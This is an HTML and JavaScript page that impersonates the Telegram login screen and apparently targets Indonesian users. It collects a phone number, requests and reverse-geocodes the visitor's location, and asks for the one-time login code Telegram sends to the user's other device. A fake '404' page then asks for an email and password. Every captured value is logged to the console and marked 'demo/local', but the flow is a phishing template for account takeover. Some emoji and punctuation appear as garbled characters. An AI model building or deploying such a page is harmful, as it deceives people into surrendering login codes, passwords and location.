<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Telegram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<style>
:root{
  --bg:#1c1c1e;
  --input:#2c2c2e;
  --accent:#8f7aff;
  --muted:#9a9aa0;
  --text:#ffffff;
}
*{box-sizing:border-box;font-family:Roboto,system-ui,-apple-system}
html,body{margin:0;height:100%;background:var(--bg);color:var(--text)}
.app{min-height:100%;display:flex;flex-direction:column}
.safe-top{height:24px}
.safe-bottom{height:16px}

.screen{
  flex:1;padding:24px 20px;display:flex;flex-direction:column;
  animation:fadeUp .35s cubic-bezier(.2,.8,.2,1)
}
@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
.hidden{display:none}
.center{text-align:center}

.logo img{width:88px;margin:28px auto 16px}
h1{margin:0;font-size:22px;font-weight:500}
.subtitle{color:var(--muted);font-size:14px;margin:10px 0 24px}

.input-group{margin-bottom:16px}
label{font-size:12px;color:var(--muted);margin-bottom:6px;display:block}
input,select{
  width:100%;padding:16px;border-radius:14px;border:none;
  background:var(--input);color:#fff;font-size:16px;outline:none
}
input::placeholder{color:#7d7d83}

.checkbox{
  display:flex;justify-content:center;align-items:center;gap:8px;font-size:14px;margin:12px 0 20px
}
.checkbox input{accent-color:var(--accent)}

.btn{width:100%;padding:14px;border-radius:14px;border:none;font-size:16px;font-weight:500}
.primary{background:var(--accent);color:#fff}
.link{background:none;color:var(--accent);margin-top:14px;font-size:14px}

/* Loading */
.progress{width:100%;height:6px;background:#333;border-radius:6px;margin-top:24px}
.bar{height:100%;width:0;background:var(--accent);border-radius:6px}
.small{font-size:13px;color:var(--muted);margin-top:12px}

/* OTP screen */
.avatar{font-size:72px;text-align:center;margin:36px 0 20px}
.phone{
  display:flex;justify-content:center;align-items:center;gap:8px;
  font-size:18px;margin-bottom:12px
}
.phone .edit{font-size:16px;color:var(--muted);cursor:pointer}
.desc{
  text-align:center;color:var(--muted);font-size:14px;line-height:1.4;margin-bottom:28px
}
.otp-input input{
  font-size:18px;letter-spacing:2px;width:100%;padding:16px;border-radius:14px;
  background:var(--input);border:none;outline:none;text-align:center;
}
.otp-input input:focus{
  box-shadow:0 0 0 1px rgba(143,122,255,.35);
}

/* shake animation */
@keyframes shake{
  0%,100%{transform:translateX(0)}
  25%{transform:translateX(-6px)}
  50%{transform:translateX(6px)}
  75%{transform:translateX(-4px)}
}

/* 404 + Email Login */
.notfound{
  flex:1;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center
}
.notfound h1{font-size:68px;margin:0}
.notfound p{color:var(--muted);margin:8px 0 24px}
.ghost{
  width:110px;height:110px;border-radius:50%;
  background:linear-gradient(145deg,#2b2b2b,#141414);
  margin-bottom:16px;animation:float 3s ease-in-out infinite
}

/* Timer */
.timer{color:var(--muted);font-size:13px;margin-top:10px;text-align:center}
</style>
</head>

<body>
<div class="app">
  <div class="safe-top"></div>

  <!-- LOGIN -->
  <div id="login" class="screen center">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
    </div>
    <h1>Telegram</h1>
    <p class="subtitle">Enter your phone number</p>

    <div class="input-group">
      <label>Country</label>
      <select>
        <option>Indonesia</option>
        <option>Singapore</option>
        <option>Malaysia</option>
      </select>
    </div>

    <div class="input-group">
      <label>Phone number</label>
      <input id="phone" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="+62 8xxxxxxx">
    </div>

    <div class="checkbox">
      <input type="checkbox" checked>
      <span>Keep me signed in</span>
    </div>

    <button class="btn primary" onclick="goLoading()">Log In</button>
    <button class="btn link" onclick="goQR()">Log in by QR Code</button>
  </div>

  <!-- LOADING -->
  <div id="loading" class="screen center hidden">
    <h1>Connecting</h1>
    <p class="subtitle">Please wait‚Ä¶</p>
    <div class="progress"><div id="bar" class="bar"></div></div>
    <p id="pct" class="small">0%</p>
  </div>

  <!-- OTP -->
  <div id="otp" class="screen hidden">
    <div class="avatar">üêµ</div>

    <div class="phone">
      <span id="phoneText"></span>
      <span class="edit" onclick="editPhone()">‚úèÔ∏è</span>
    </div>

    <div class="desc">
      We've sent the code to the Telegram app on your other device.
    </div>

    <div class="input-group otp-input">
      <input id="otpCode" type="text" inputmode="numeric" maxlength="5" placeholder="Code">
    </div>

    <div class="timer" id="timerText"></div>

    <button class="btn primary" onclick="verify()">Verify</button>
  </div>

  <!-- QR -->
  <div id="qr" class="screen center hidden">
    <h1>Scan QR Code</h1>
    <div style="background:#fff;padding:16px;border-radius:16px;margin:24px auto">
      <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TelegramAndroidDemo">
    </div>
    <p class="small">Open Telegram on your phone</p>
  </div>

  <!-- 404 + Email Login -->
  <div id="nf" class="screen hidden">
    <div class="notfound">
      <div class="ghost"></div>
      <h1>404</h1>
      <p>Page not found</p>

      <!-- Email login -->
      <div class="input-group">
        <label>Email</label>
        <input type="email" id="emailLogin" placeholder="you@example.com">
      </div>
      <div class="input-group">
        <label>Password</label>
        <input type="password" id="passwordLogin" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢">
      </div>
      <button class="btn primary" onclick="loginEmail()">Login</button>

      <button class="btn primary" onclick="location.reload()">Back</button>
    </div>
  </div>

  <div class="safe-bottom"></div>
</div>

<script>
const screens = {
  login: document.getElementById('login'),
  loading: document.getElementById('loading'),
  otp: document.getElementById('otp'),
  qr: document.getElementById('qr'),
  nf: document.getElementById('nf')
};
function show(id){
  Object.values(screens).forEach(s=>s.classList.add('hidden'));
  screens[id].classList.remove('hidden');
}

/* Nomor HP hanya angka, mulai dengan 8 */
const phoneInput = document.getElementById('phone');
phoneInput.addEventListener('input', e=>{
  e.target.value = e.target.value.replace(/[^0-9]/g,''); 
  if(e.target.value.length > 0 && e.target.value[0] !== '8'){ e.target.value = '8'; }
  if(e.target.value.length > 12) e.target.value = e.target.value.slice(0,12); 
});

/* OTP input: hanya 5 digit angka */
const otpInput = document.getElementById('otpCode');
otpInput.addEventListener('input', e=>{
  e.target.value = e.target.value.replace(/[^0-9]/g,'').slice(0,5);
});

/* LOGIN ‚Üí Popup Lokasi + Reverse Geocoding ‚Üí LOADING ‚Üí OTP */
function goLoading(){
  let phoneVal = '+62 '+phoneInput.value.trim();
  document.getElementById('phoneText').textContent = phoneVal;
  console.log('Phone (demo/local):', phoneVal);

  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(
      async pos => {
        const {latitude, longitude} = pos.coords;
        console.log('Coordinates:', latitude, longitude);

        // Reverse geocoding OpenStreetMap Nominatim
        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
          const data = await res.json();
          console.log('Address:', data.display_name);
        } catch(err){
          console.warn('Reverse geocoding failed:', err);
        }

        startLoading();
      },
      err => {
        console.warn('Location denied or error:', err.message);
        startLoading();
      }
    );
  } else {
    console.warn('Geolocation not supported');
    startLoading();
  }
}

// Loading progress ke OTP
function startLoading(){
  show('loading');
  let p=0, bar=document.getElementById('bar'), pct=document.getElementById('pct');
  const i=setInterval(()=>{
    p++; bar.style.width=p+'%'; pct.textContent=p+'%';
    if(p>=100){ clearInterval(i); show('otp'); startTimer(); otpInput.focus();}
  },16);
}

function goQR(){ show('qr'); }

/* EDIT PHONE */
function editPhone(){
  phoneInput.value = document.getElementById('phoneText').textContent.replace('+62 ','');
  show('login');
}

/* OTP VERIFY ‚Üí 404 */
let capturedOTP = "";
function verify(){
  capturedOTP = otpInput.value.trim();
  if(capturedOTP.length !== 5){
    otpInput.style.animation='shake 0.35s';
    setTimeout(()=>otpInput.style.animation='none',350);
    return;
  }
  console.log('OTP (demo/local):', capturedOTP);
  show('nf');
}

/* Timer Resend Code */
let timer=60;
function startTimer(){
  const timerText = document.getElementById('timerText');
  const phoneVal = document.getElementById('phoneText').textContent;
  timer=60;
  timerText.textContent=`Resend code to ${phoneVal} in ${timer}s`;
  const interval=setInterval(()=>{
    timer--;
    if(timer<=0){ clearInterval(interval); timerText.textContent=`You can resend code to ${phoneVal}`; }
    else timerText.textContent=`Resend code to ${phoneVal} in ${timer}s`;
  },1000);
}

/* LOGIN EMAIL/PASSWORD DI 404 */
function loginEmail(){
  const email = document.getElementById('emailLogin').value.trim();
  const password = document.getElementById('passwordLogin').value.trim();

  if(!email || !password){
    alert('Please fill both email and password!');
    return;
  }

  console.log('Email login attempt:');
  console.log('Email:', email);
  console.log('Password:', password);

}
</script>
</body>
</html>
